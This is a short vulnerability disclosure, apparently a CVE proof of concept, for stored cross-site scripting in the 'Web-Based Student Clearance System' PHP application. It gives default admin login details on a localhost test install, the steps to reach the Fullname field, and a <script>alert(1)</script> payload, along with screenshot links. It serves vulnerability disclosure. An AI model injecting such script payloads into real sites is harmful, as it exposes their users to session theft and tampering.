### Web-Based Student Clearance System - XSS

### Date: 2024-02/26
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html
### Tested on: MacOs13.5 + phpstudy

### 1,Login Admin System 

http://127.0.0.1:8889/admin/login.php
Username: admin
Password: admin123

### 2,Edit User Management 
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708934109647.jpg "Web-Based Student Clearance System")

### 3,Edit Fullname Poc And submit
```
<script>alert(1)</script>
```
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708934189450.jpg "Web-Based Student Clearance System")
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708934232509.jpg "Web-Based Student Clearance System")
